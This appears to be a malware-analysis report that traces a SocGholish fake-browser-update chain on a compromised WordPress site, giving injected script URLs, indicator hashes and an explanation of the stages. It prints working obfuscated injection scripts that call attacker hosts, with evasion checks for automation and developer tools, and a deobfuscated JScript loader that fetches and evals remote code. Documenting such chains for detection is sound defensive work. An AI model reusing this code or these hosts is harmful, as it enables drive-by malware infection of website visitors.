THREAT IDENTIFICATION:  SOCGHOLISH

INFECTED DOMAIN
teleray.com

STAGE 1 INJECTED URLS
https://teleray.com/wp-content/plugins/activeblogs/cav.js
https://teleray.com/wp-content/plugins/super-progressive-web-apps/public/js/register-sw.js
https://teleray.com/wp-content/themes/teleray/js/navigation.js?ver=1.0.0
https://teleray.com/wp-content/themes/teleray/js/main.js?ver=1.0.0
https://teleray.com/wp-content/plugins/happy-elementor-addons-pro/assets/js/happy-addons-pro.js?ver=2.7.1
https://teleray.com/wp-content/plugins/wpforms-lite/assets/js/integrations/elementor/frontend.min.js?ver=1.8.4.1
https://teleray.com/superpwa-sw.js?2.2.5

STAGE 2 URLS
https://webcachedata.com/app.min.js?ver=whcz7ol00ic5yvcjfdsqa

STAGE 2 EMBEDDED SCRIPT
var ndsx = true;(function(l,n,b,h,x,e){x=n.createElement(b);e=n.getElementsByTagName(b)[0];x.async=1;x.src=h;e.parentNode.insertBefore(x,e);})(window,document,'script','https://modification.grebcocontractors.com/0YPq1qqhib+1odDk5LbG9KOh0PS35IOypOzIqw==');

STAGE 3 INITIAL URL
https://modification.grebcocontractors.com/0YPq1qqhib+1odDk5LbG9KOh0PS35IOypOzIqw==

STAGE 3 SCRIPT
;(function () {
  var _0x5d988e = window,
    _0x141974 = _0x5d988e.document.cookie
  var _0x5cd3b7 = 'adViewEnabled'
  if (_0x5d988e.localStorage[_0x5d988e.location.hostname]) {
    return
  }
  if (_0x5d988e.navigator.webdriver) {
    _0x1eeb53(
      'https://modification.grebcocontractors.com/yVjfaLJ6vAGteuVa/G3zSrosuhjrYv0Yuz28AKw7tDejK4AOuzexHKwqrQe7evNKrCqtB7t65Vnleq1K83q+GbstqgelPKcNoCy1SrQ='
    )
    return
  }
  if (
    _0x5d988e.outerHeight - _0x5d988e.innerHeight > 200 ||
    _0x5d988e.outerWidth - _0x5d988e.innerWidth > 330
  ) {
    _0x1eeb53(
      'https://modification.grebcocontractors.com/87KhlYiQwvyXkJunxoeNt4DGxOXRiIPlgdfC/ZbRysqZwf7zgd3P4ZbA0/qBkI23lsDT+oGQm6ffkNO3yZDZ7IvGxv2RkNw='
    )
    return
  }
  if (
    _0x141974.indexOf('wordpress_logged_in_') !== -1 ||
    _0x141974.indexOf('wp-settings-') !== -1
  ) {
    return
  }
  if (typeof _0x5d988e[_0x5cd3b7] !== 'undefined') {
    return
  }
  _0x5d988e[_0x5cd3b7] = true
  _0x5d988e.addEventListener('mousemove', _0x5406d4, true)
  function _0x5406d4() {
    _0x5d988e.removeEventListener('mousemove', _0x5406d4, true)
    _0x1eeb53(
      'https://modification.grebcocontractors.com/5F3hxp9/gq+Af9v00WjN5JcphLbGZ8OnijyNv544vqCUf83kln/b5IAqgLKXJ5G8gDyTpJY5jaTGIA=='
    )
  }
  function _0x1eeb53(_0x8d7c28) {
    var _0x525587 = document.createElement('script')
    _0x525587.async = true
    _0x525587.src = _0x8d7c28
    var _0x517254 = document.getElementsByTagName('script')[0]
    _0x517254.parentNode.insertBefore(_0x525587, _0x517254)
  }
})()

SCRIPT EXPLANATION
The provided script is a self-invoking anonymous function that performs several checks and then makes a network request to different URLs based on the conditions. Here's a breakdown of what the script does:

1. It checks if the current domain is present in the localStorage. If it is, the script stops executing.

2. It checks if the browser is controlled by WebDriver (commonly used for automated testing). If it is, the script makes a network request to a specific URL and then stops executing.

3. It checks if the difference between the outer height and inner height of the window is greater than 200, or if the difference between the outer width and inner width is greater than 330. If either condition is met, the script makes a network request to a specific URL and then stops executing.

4. It checks if the document's cookies contain specific strings related to WordPress. If they do, the script stops executing.

5. It checks if a variable named 'adViewEnabled' is defined in the window object. If it is, the script stops executing.

6. If all the above conditions are not met, the script sets the 'adViewEnabled' variable to true, adds an event listener for the 'mousemove' event, and defines a function to be executed when the 'mousemove' event occurs. When the 'mousemove' event occurs, the event listener is removed, and the script makes a network request to a specific URL.

FAKE BROWSER PAGE - EMBEDDED
https://modification.grebcocontractors.com/5F3hxp9/gq+Af9v00WjN5JcphLbGZ8OnijyNv544vqCUf83kln/b5IAqgLKXJ5G8gDyTpJY5jaTGIA==

ZIP FILE DOWNLOAD URL
https://modification.grebcocontractors.com/rE7MQtdsryvIbPZwmXvgYN86qTKOdO4uzSCoK8IpkyTFIqlggGy+YJZsuirHL6cszz6+Nt49qijENu4/

ZIP FILE HASH
UpdateInstaller.zip
e868e98485d4a892c527e74f44a4bb17
(File name uses 2 homoglyph characters - I've replaved them in the file name above for clarity)

JAVASCRIPT FILE HASH
Version.120.9439.21.js
c33980cfce6e278f0c2740f7ab24516e

DEOBFUSCATED JAVASCRIPT FILE CONTENTS
if (1) {
function a0_0x48a8b0(_0x150fec) {
var _0x29bd30 = 'responseText'
return _0x150fec[_0x29bd30]
}

var a0_0x972ac7 = new this.ActiveXObject('MSXML2.XMLHTTP')
a0_0x972ac7.open(

'POST',
'https://ucbwp.caching.oysterfloats.com/editContent',
false
)
a0_0x972ac7.setRequestHeader('Upgrade-Insecure-Requests', '1')
a0_0x972ac7.send('P73SQQXUZnMQyqYwGYAOaPP6vXnJwNSbvhk0tFCF4A==')
this.eval(a0_0x48a8b0(a0_0x972ac7))
}

PAYLOAD DOWNLOAD URL
https://ucbwp.caching.oysterfloats.com/editContent

PAYLOAD FILE HASH
I was not able to get a payload

PAYLOAD C2
I was not able to get a payload

ADDITIONAL REFERENCES
https://github.com/malwareinfosec/malwareinfosec.github.io/blob/main/Web/FakeBrowserUpdates/fakebrowserupdates.md




